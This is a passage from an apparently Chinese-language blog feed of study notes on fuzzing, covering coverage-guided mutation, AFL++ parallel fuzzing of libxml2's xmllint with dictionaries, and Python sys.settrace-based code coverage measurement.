class="line">            self.inp = self.seed[self.seed_index]</span><br><span class="line">            self.seed_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Mutating</span></span><br><span class="line">            self.inp = self.create_candidate()</span><br><span class="line">        <span class="keyword">return</span> self.inp</span><br></pre></td></tr></table></figure><h2 id="用覆盖率引导变异"><a href="#用覆盖率引导变异" class="headerlink" title="用覆盖率引导变异"></a>用覆盖率引导变异</h2><p>这也是变异中非常需要关注的，<strong>如何用程序的结构来引导变异</strong>。这样可以增加代码覆盖面积。</p><p>fuzzingbook中，使用了一个和AFL十分相近的引导方法——如果覆盖率增加了，就说明这次变异产生了良好的效果。可以使用python自带的<a href="https://www.google.com.hk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjM056cjc32AhWNMZQKHRs_AfUQFnoECBcQAw&url=https://coverage.readthedocs.io/&usg=AOvVaw1_UZjC7lKZbTNEfvza8pJk">coverage库</a>实现对代码覆盖面的评估。</p><p>==但是这里找了很久，也没有找到fuzzingbook中关于coverage()方法返回值的说明?==也就是下面一行</p><p><img src="/2022/03/16/fuzzing-5-parallelize/image-20220317201033577.png" alt="image-20220317201033577"></p><p>不太清楚第返回值的每一个元组中二个参数的含义是什么。</p><p>我们循环运行一个程序，每当coverage没有出现在当前集合中时，就输出这样的输入。因为这样的输入产生了<strong>新的路径</strong>。</p><h1 id="fuzzing101环境"><a href="#fuzzing101环境" class="headerlink" title="fuzzing101环境"></a>fuzzing101环境</h1><p><a href="https://gnome.pages.gitlab.gnome.org/libxml2/xmllint.html">LibXML2</a>安装，编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget http://xmlsoft.org/download/libxml2-2.9.4.tar.gz</span><br><span class="line">tar xvf libxml2-2.9.4.tar.gz &amp;&amp; cd libxml2-2.9.4/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以看到以下编译加上了ASAN检查</span></span><br><span class="line">sudo apt-get install python-dev</span><br><span class="line">CC=afl-clang-lto CXX=afl-clang-lto++ CFLAGS=&quot;-fsanitize=address&quot; CXXFLAGS=&quot;-fsanitize=address&quot; LDFLAGS=&quot;-fsanitize=address&quot; ./configure --prefix=&quot;$HOME/Fuzzing_libxml2/libxml2-2.9.4/install&quot; --disable-shared --without-debug --without-ftp --without-http --without-legacy --without-python LIBS=&#x27;-ldl&#x27;</span><br><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>上网查看一下这个<a href="https://gnome.pages.gitlab.gnome.org/libxml2/xmllint.html">库的作用</a>是什么。大致是一个xml库的命令行处理工具。</p><blockquote><p>The <strong>xmllint</strong> program parses one or more XML files,     specified on the command line as <em><code>XML-FILE</code></em>     (or the standard input if the filename provided     is <strong>-</strong> ). It prints various types of     output, depending upon the options selected. It is useful for detecting     errors both in XML code and in     the XML parser itself.</p></blockquote><h2 id="Dictionaries"><a href="#Dictionaries" class="headerlink" title="Dictionaries"></a>Dictionaries</h2><p>当我们要fuzz的程序是文本相关的时候，给fuzzer提供一个包含一列基本参数信息的字典是很有帮助的，fuzzer可以用这个来对当前内存中的文件做一些修改，具体而言，包括<strong>替换</strong>和<strong>插入</strong>。</p><p>AFL++官网给我们提供了一系列字典，<a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable/dictionaries">链接</a>。给fuzzer提供<code>-x</code>参数即可指定dictionaries的位置。</p><h2 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h2><p>在多核系统上，开启多个fuzzer能够最大化的并行程序。由于AFL使用的是不确定的算法，因此我们只要随机运行多个AFL，就能得到不同的变异结果等。但是如果指定了seed，需要确保seed两两不相同。可以看出afl的不确定性算法就是依赖于seed的随机性。</p><p><a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#c-using-multiple-cores">AFL 多核fuzz官方文档</a>。可以看到我们必须为每一个fuzzer创建一个名字，无论是master还是slave。其次，他们必须共享一个out文件夹。一般而言，子fuzzer需要满足以下要求。</p><p><img src="/2022/03/16/fuzzing-5-parallelize/image-20220316220903643.png" alt="image-20220316220903643"></p><p>第一项就是之前了解过的ASAN</p><p>第二项和控制流分支中的数据处理相关。fuzzer可以在数据被比较之前修改它，达到覆盖更多控制流。</p><p>第三项和第二项列在一起，主要是将整数、字符串、浮点数和switch等等分开，单独拿出来变异等，让AFL能够更全面的解决分支处理。</p><p>AFL有两种并行方式，<strong>独自生成</strong>和<strong>共享份额</strong>。独自生成前一段讲述的内容，共享份额是fuzzer从所有别的fuzzer输出的信息中中获取别的testcase。</p><p>除此以外，fuzzer之间还可以并行联合。在上面的链接中也有提到。</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>使用以下两个命令启动AFL。可以看到slave进程不需要设置 -x (是为了对比?还是不用设置呢)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动master进程</span></span><br><span class="line">afl-fuzz -m none -i ./afl_in -o afl_out -s 123 -x ./dictionaries/xml.dict -D -M master -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动slave进程</span></span><br><span class="line">afl-fuzz -m none -i ./afl_in -o afl_out -s 234 -S slave1 -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br></pre></td></tr></table></figure><p>但是，在经过了将近24小时的fuzz之后，我仍然没有找到crash，最终还是放弃了。</p><p><img src="/2022/03/16/fuzzing-5-parallelize/image-20220317201351435.png" alt="image-20220317201351435"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在fuzzingbook中，通过python的几个例子，学到了变异的基本原理——随机删除or插入or异或新的数值产生相比于当前输入有所不同的其他输入。在这之后，了解到了如何通过代码覆盖面来引导变异，也就是如果发现了新的运行分支，就把当前的输入保存下来，后续进一步变异。</p><p>在fuzzing101中，学会了怎么对文本处理型的binary进行fuzz(加上-x参数)以及如何并发的fuzz多个程序(利用-S选项)虽然并没有得到结果，但是也收获良多。</p>]]></content>
      
      
      <categories>
          
          <category> projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> fuzzing101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzzing-4</title>
      <link href="/2022/03/15/fuzzing-4-code_coverage/"/>
      <url>/2022/03/15/fuzzing-4-code_coverage/</url>
      
        <content type="html"><![CDATA[<p>有关使用LCOV完成对code coverage的覆盖检测。<br>相关文件：LibTIFF</p><span id="more"></span><h1 id="code-coverage"><a href="#code-coverage" class="headerlink" title="code_coverage"></a>code_coverage</h1><p>在<a href="www.fuzzingbook.org">fuzzingbook</a>上面学习有关code_coverage的理论知识。</p><h2 id="black-white-box"><a href="#black-white-box" class="headerlink" title="black/white box"></a>black/white box</h2><p>黑盒测试的好处在于，能够将一个<em>指定的</em>内容进行测试。我们可以设置输入的内容，可以让我们在部署好测试方案之前开始测试。但是与之带来的缺点就是代码覆盖面相对较窄。白盒测试正好相反，白盒测试缺点可能是我们部署的方案不一定有效，但是优点就在于可以覆盖更广的代码。</p><p><strong>那么我们怎么衡量fuzzer覆盖的全面与否呢?就是通过计算code coverage</strong>。</p><h2 id="python中的追踪"><a href="#python中的追踪" class="headerlink" title="python中的追踪"></a>python中的追踪</h2><p>大部分的程序设计语言很难做到对于每一步的运行过程进行追踪，python可以做到。利用以下函数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys.settrace(f)</span><br><span class="line">f: 一个我们自定义的函数，当每一行被执行时，函数f就会被调用。</span><br><span class="line">    如果想要查看当前执行到的行数的相关内容，使用frame参数</span><br><span class="line">- frame.f_code:当前执行的code</span><br><span class="line">- frame.f_code.co_name:当前执行中的函数名称</span><br><span class="line">- frame.f_lineno: 当前执行的行数</span><br><span class="line">- frame.f_locals: 当前执行的本地变量和参数</span><br></pre></td></tr></table></figure><p>例如，一个trace回调函数如下.这个回调函数的作用是记录每一次调用的python代码的行号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">traceit</span>(<span class="params">frame: FrameType, event: <span class="built_in">str</span>, arg: <span class="type">Any</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Callable</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Trace program execution. To be passed to sys.settrace().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;line&#x27;</span>: <span class="comment"># event可以是line或者call(一个正在被调用的函数)</span></span><br><span class="line">        <span class="keyword">global</span> coverage</span><br><span class="line">        function_name = frame.f_code.co_name</span><br><span class="line">        lineno = frame.f_lineno</span><br><span class="line">        coverage.append(lineno)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> traceit</span><br></pre></td></tr></table></figure><p>编写一个包装函数，用来调用<strong>sys.settrace</strong>和释放<strong>sys.settrace</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cgi_decode_traced</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> coverage</span><br><span class="line">    coverage = []</span><br><span class="line">    sys.settrace(traceit)  <span class="comment"># Turn on</span></span><br><span class="line">    cgi_decode(s)</span><br><span class="line">    sys.settrace(<span class="literal">None</span>)    <span class="comment"># Turn off</span></span><br></pre></td></tr></table></figure><p>接下来就可以调用这个包装函数了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cgi_decode_traced(<span class="string">&quot;a+b&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(coverage)</span><br><span class="line"><span class="comment"># 结果即为执行的行号</span></span><br><span class="line"><span class="comment">#[8, 9, 8, 9, 8, 9, 8, 9, 8, 9, 8, 10, 8, 10, 8, 10, 8, 10, 8, 10, 8, 11, 8, 11, 8, 11, 8, 11, 8, 11, 8, 11, 8, 12, 8, 12, 8, 15, 16, 17, 18, 19, 21, 30, 31, 17, 18, 19, 20, 31, 17, 18, 19, 21, 30, 31, 17, 32]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果我们打印coverage的集合形式(去除重复的行号之后的结果)，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">covered_lines = <span class="built_in">set</span>(coverage)</span><br><span class="line"><span class="built_in">print</span>(covered_lines)</span><br><span class="line"><span class="comment"># &#123;32, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 30, 31&#125;</span></span><br></pre></td></tr></table></figure><p>如果想用可视化形式表示，并且打印出执行了什么代码，可以按照如下方法。考虑先打印一个”#”，并且不换行(如果行号<strong>不在</strong>执行过的语句中)，之后打印代码行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取一个函数的源码</span></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line">cgi_decode_code = inspect.getsource(cgi_decode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将一个函数的源码用换行符分割</span></span><br><span class="line">cgi_decode_lines = [<span class="string">&quot;&quot;</span>] + cgi_decode_code.splitlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印哪些代码被覆盖了</span></span><br><span class="line"><span class="keyword">for</span> lineno <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cgi_decode_lines)):</span><br><span class="line">    <span class="keyword">if</span> lineno <span class="keyword">not</span> <span class="keyword">in</span> covered_lines:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;# &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%2d  &quot;</span> % lineno, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print_content(cgi_decode_lines[lineno], <span class="string">&#x27;.py&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下。注意这是合理的，因为我们的输入是a+b，之然不会到百分号所在的分支中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  1  def cgi_decode(s: str) -&gt; str:</span></span><br><span class="line"><span class="comment">#  2      &quot;&quot;&quot;Decode the CGI-encoded string `s`:</span></span><br><span class="line"><span class="comment">#  3         * replace &#x27;+&#x27; by &#x27; &#x27;</span></span><br><span class="line"><span class="comment">#  4         * replace &quot;%xx&quot; by the character with hex number xx.</span></span><br><span class="line"><span class="comment">#  5         Return the decoded string.  Raise `ValueError` for invalid inputs.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#  6  </span></span><br><span class="line"><span class="comment">#  7      # Mapping of hex digits to their integer values</span></span><br><span class="line">   <span class="number">8</span>      hex_values = &#123;</span><br><span class="line">   <span class="number">9</span>          <span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>: <span class="number">4</span>,</span><br><span class="line">  <span class="number">10</span>          <span class="string">&#x27;5&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>: <span class="number">9</span>,</span><br><span class="line">  <span class="number">11</span>          <span class="string">&#x27;a&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;f&#x27;</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="number">12</span>          <span class="string">&#x27;A&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;D&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;E&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;F&#x27;</span>: <span class="number">15</span>,</span><br><span class="line"><span class="comment"># 13      &#125;</span></span><br><span class="line"><span class="comment"># 14  </span></span><br><span class="line">  <span class="number">15</span>      t = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="number">16</span>      i = <span class="number">0</span></span><br><span class="line">  <span class="number">17</span>      <span class="keyword">while</span> i &lt; <span class="title function_ invoke__">len</span>(s):</span><br><span class="line">  <span class="number">18</span>          c = s[i]</span><br><span class="line">  <span class="number">19</span>          <span class="keyword">if</span> c == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">  <span class="number">20</span>              t += <span class="string">&#x27; &#x27;</span></span><br><span class="line">  <span class="number">21</span>          elif c == <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line"><span class="comment"># 22              digit_high, digit_low = s[i + 1], s[i + 2]</span></span><br><span class="line"><span class="comment"># 23              i += 2</span></span><br><span class="line"><span class="comment"># 24              if digit_high in hex_values and digit_low in hex_values:</span></span><br><span class="line"><span class="comment"># 25                  v = hex_values[digit_high] * 16 + hex_values[digit_low]</span></span><br><span class="line"><span class="comment"># 26                  t += chr(v)</span></span><br><span class="line"><span class="comment"># 27              else:</span></span><br><span class="line"><span class="comment"># 28                  raise ValueError(&quot;Invalid encoding&quot;)</span></span><br><span class="line"><span class="comment"># 29          else:</span></span><br><span class="line">  <span class="number">30</span>              t += c</span><br><span class="line">  <span class="number">31</span>          i += <span class="number">1</span></span><br><span class="line">  <span class="number">32</span>      <span class="keyword">return</span> t</span><br></pre></td></tr></table></figure><p>我们同样可以写脚本判断哪一次执行将带入新的行数，以及能够运行多少行。</p><h3 id="coverage类"><a href="#coverage类" class="headerlink" title="coverage类"></a>coverage类</h3><p>之前我们显式的调用了traceit()，现在我们尝试把他整合到一个类里面去，让类帮我们完成初始化和释放操作。使用如下的python方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> OBJECT [<span class="keyword">as</span> VARIABLE]:</span><br><span class="line">    BODY</span><br></pre></td></tr></table></figure><p>在执行这条语句的时候，我们将会<strong>在OBJECT被实例化和储存VARIABLE的情况下在执行BODY</strong>。比较有趣的事情是在BODY的开始和结束，OBJECT.<strong>enter</strong>()以及OBJECT.<strong>exit</strong>()会被隐式调用。我们就可以在这两个初始化、结束函数中放入之前的trace初始化和释放函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Coverage</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Track coverage within a `with` block. Use as</span></span><br></pre></td></tr></table></figure><pre><code>with Coverage() as cov:    function_to_be_traced()c = cov.coverage()<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line"># 初始化一个用于储存所有被执行的行数的list</span><br><span class="line"># location是一个(function,line number)的list</span><br><span class="line">def __init__(self) -&gt; None:</span><br><span class="line">    &quot;&quot;&quot;Constructor&quot;&quot;&quot;</span><br><span class="line">    self._trace: List[Location] = []</span><br><span class="line"></span><br><span class="line"># Trace function</span><br><span class="line">def traceit(self, frame: FrameType, event: str, arg: Any) -&gt; Optional[Callable]:</span><br><span class="line">    &quot;&quot;&quot;Tracing function. To be overloaded in subclasses.&quot;&quot;&quot;</span><br><span class="line">    if self.original_trace_function is not None:</span><br><span class="line">        self.original_trace_function(frame, event, arg)</span><br><span class="line"></span><br><span class="line">    if event == &quot;line&quot;:</span><br><span class="line">        function_name = frame.f_code.co_name</span><br><span class="line">        lineno = frame.f_lineno</span><br><span class="line">        if function_name != &#x27;__exit__&#x27;:  # avoid tracing ourselves:</span><br><span class="line">            self._trace.append((function_name, lineno))</span><br><span class="line"></span><br><span class="line">    return self.traceit</span><br><span class="line"></span><br><span class="line"># 进入with之后将被执行</span><br><span class="line">def __enter__(self) -&gt; Any:</span><br><span class="line">    &quot;&quot;&quot;Start of `with` block. Turn on tracing.&quot;&quot;&quot;</span><br><span class="line">    self.original_trace_function = sys.gettrace()</span><br><span class="line">    sys.settrace(self.traceit)</span><br><span class="line">    return self</span><br><span class="line"></span><br><span class="line"># 退出时执行</span><br><span class="line">def __exit__(self, exc_type: Type, exc_value: BaseException, </span><br><span class="line">             tb: TracebackType) -&gt; Optional[bool]:</span><br><span class="line">    &quot;&quot;&quot;End of `with` block. Turn off tracing.&quot;&quot;&quot;</span><br><span class="line">    sys.settrace(self.original_trace_function)</span><br><span class="line">    return None  # default: pass all exceptions</span><br><span class="line"></span><br><span class="line"># 返回trace的list</span><br><span class="line">def trace(self) -&gt; List[Location]:</span><br><span class="line">    &quot;&quot;&quot;The list of executed lines, as (function_name, line_number) pairs&quot;&quot;&quot;</span><br><span class="line">    return self._trace</span><br><span class="line"></span><br><span class="line">def coverage(self) -&gt; Set[Location]:</span><br><span class="line">    &quot;&quot;&quot;The set of executed lines, as (function_name, line_number) pairs&quot;&quot;&quot;</span><br><span class="line">    return set(self.trace())</span><br><span class="line"></span><br><span class="line">def function_names(self) -&gt; Set[str]:</span><br><span class="line">    &quot;&quot;&quot;The set of function names seen&quot;&quot;&quot;</span><br><span class="line">    return set(function_name for (function_name, line_number) in self.coverage())</span><br><span class="line"></span><br><span class="line"># 打印出带有源码的执行与否标记，当直接调用print()时执行</span><br><span class="line">def __repr__(self) -&gt; str:</span><br><span class="line">    &quot;&quot;&quot;Return a string representation of this object.</span><br><span class="line">       Show covered (and uncovered) program code&quot;&quot;&quot;</span><br><span class="line">    t = &quot;&quot;</span><br><span class="line">    for function_name in self.function_names():</span><br><span class="line">        # Similar code as in the example above</span><br><span class="line">        try:</span><br><span class="line">            fun = eval(function_name)</span><br><span class="line">        except Exception as exc:</span><br><span class="line">            t += f&quot;Skipping &#123;function_name&#125;: &#123;exc&#125;&quot;</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        source_lines, start_line_number = inspect.getsourcelines(fun)</span><br><span class="line">        for lineno in range(start_line_number, start_line_number + len(source_lines)):</span><br><span class="line">            if (function_name, lineno) in self.trace():</span><br><span class="line">                t += &quot;# &quot;</span><br><span class="line">            else:</span><br><span class="line">                t += &quot;  &quot;</span><br><span class="line">            t += &quot;%2d  &quot; % lineno</span><br><span class="line">            t += source_lines[lineno - start_line_number]</span><br><span class="line"></span><br><span class="line">    return t</span><br></pre></td></tr></table></figure></code></pre><p>之后就可以用以下代码来简单的trace某个函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov:</span><br><span class="line">    function_to_be_traced()</span><br><span class="line">c = cov.coverage()</span><br></pre></td></tr></table></figure><p>可以用来输出执行的行号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov:</span><br><span class="line">    cgi_decode(<span class="string">&quot;a+b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cov.coverage())</span><br><span class="line"><span class="comment"># &#123;(&#x27;cgi_decode&#x27;, 16), (&#x27;cgi_decode&#x27;, 32), (&#x27;cgi_decode&#x27;, 19), (&#x27;cgi_decode&#x27;, 9), (&#x27;cgi_decode&#x27;, 12), (&#x27;cgi_decode&#x27;, 18), (&#x27;cgi_decode&#x27;, 31), (&#x27;cgi_decode&#x27;, 15), (&#x27;cgi_decode&#x27;, 21), (&#x27;cgi_decode&#x27;, 11), (&#x27;cgi_decode&#x27;, 8), (&#x27;cgi_decode&#x27;, 30), (&#x27;cgi_decode&#x27;, 17), (&#x27;cgi_decode&#x27;, 20), (&#x27;cgi_decode&#x27;, 10)&#125;</span></span><br></pre></td></tr></table></figure><p>如果直接print(cov)将相当于调用重载的repr输出带有某一句执行与否的源码。带”#”表示执行过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(cov)</span><br><span class="line"><span class="comment"># 以下为输出</span></span><br><span class="line">   <span class="number">1</span>  <span class="keyword">def</span> <span class="title function_">cgi_decode</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">   <span class="number">2</span>      <span class="string">&quot;&quot;&quot;Decode the CGI-encoded string `s`:</span></span><br><span class="line"><span class="string">   3         * replace &#x27;+&#x27; by &#x27; &#x27;</span></span><br><span class="line"><span class="string">   4         * replace &quot;%xx&quot; by the character with hex number xx.</span></span><br><span class="line"><span class="string">   5         Return the decoded string.  Raise `ValueError` for invalid inputs.&quot;&quot;&quot;</span></span><br><span class="line">   <span class="number">6</span>  </span><br><span class="line">   <span class="number">7</span>      <span class="comment"># Mapping of hex digits to their integer values</span></span><br><span class="line"><span class="comment">#  8      hex_values = &#123;</span></span><br><span class="line"><span class="comment">#  9          &#x27;0&#x27;: 0, &#x27;1&#x27;: 1, &#x27;2&#x27;: 2, &#x27;3&#x27;: 3, &#x27;4&#x27;: 4,</span></span><br><span class="line"><span class="comment"># 10          &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9,</span></span><br><span class="line"><span class="comment"># 11          &#x27;a&#x27;: 10, &#x27;b&#x27;: 11, &#x27;c&#x27;: 12, &#x27;d&#x27;: 13, &#x27;e&#x27;: 14, &#x27;f&#x27;: 15,</span></span><br></pre></td></tr></table></figure><p>我们还可以比较两个coverage，因为他们带有集合的性质。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov_plus:</span><br><span class="line">    cgi_decode(<span class="string">&quot;a+b&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> Coverage() <span class="keyword">as</span> cov_standard:</span><br><span class="line">    cgi_decode(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"></span><br><span class="line">cov_plus.coverage() - cov_standard.coverage()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一下输出表示前者相比于后者多执行了第20行代码</span></span><br><span class="line"><span class="comment"># &#123;(&#x27;cgi_decode&#x27;, 